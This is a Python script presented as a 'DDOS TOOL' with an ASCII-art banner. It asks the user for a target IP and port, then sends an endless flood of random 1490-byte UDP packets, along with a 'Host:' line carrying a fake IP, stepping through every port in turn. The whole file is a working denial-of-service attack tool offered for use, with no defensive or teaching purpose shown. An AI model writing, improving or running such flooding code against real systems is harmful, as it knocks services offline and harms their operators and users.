import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
fake_ip = '44.197.175.168'

white = '\033[97m'
green = '\033[92m'
red = '\033[91m'
end = '\033[0m'

design = f"                    {white}DDOS {green}TOOL BY {red}Hack??01{end}"
print(f'''
{green}
████████▄  ████████▄   ▄██████▄     ▄████████    ▄█    █▄       ▄████████  ▄████████    ▄█   ▄█▄ 
███   ▀███ ███   ▀███ ███    ███   ███    ███   ███    ███     ███    ███ ███    ███   ███ ▄███▀ 
███    ███ ███    ███ ███    ███   ███    █▀    ███    ███     ███    ███ ███    █▀    ███▐██▀   
███    ███ ███    ███ ███    ███   ███         ▄███▄▄▄▄███▄▄   ███    ███ ███         ▄█████▀    
███    ███ ███    ███ ███    ███ ▀███████████ ▀▀███▀▀▀▀███▀  ▀███████████ ███        ▀▀█████▄    
███    ███ ███    ███ ███    ███          ███   ███    ███     ███    ███ ███    █▄    ███▐██▄   
███   ▄███ ███   ▄███ ███    ███    ▄█    ███   ███    ███     ███    ███ ███    ███   ███ ▀███▄ 
████████▀  ████████▀   ▀██████▀   ▄████████▀    ███    █▀      ███    █▀  ████████▀    ███   ▀█▀ 

    {design * 1}

	''')  # The graphics are there
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     try:
         sock.sendto(bytes, (ip,port))
         sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
         sent = sent + 1
         port = port + 1
         print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
         if port == 65534:
           port = 1
     except socket.error:
         print("Error: Unable to send packet")